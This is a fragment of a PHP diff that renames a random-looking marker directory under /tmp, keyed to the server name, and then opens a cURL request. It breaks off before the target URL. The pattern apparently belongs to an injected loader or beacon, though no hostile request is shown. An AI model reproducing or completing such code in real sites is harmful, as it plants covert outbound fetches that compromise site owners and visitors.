@@ -1,8 +1,8 @@
 <?php
 $random = rand(1,6);
 $d=$_SERVER['SERVER_NAME'];
-if(filesize('/tmp/mnhcvva'.$d.$random)) { } else {
-	mkdir('/tmp/mnhcvva'.$d.$random);
+if(filesize('/tmp/tnhtntnera'.$d.$random)) { } else {
+	mkdir('/tmp/tnhtntnera'.$d.$random);
   $curl3 = curl_init();
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
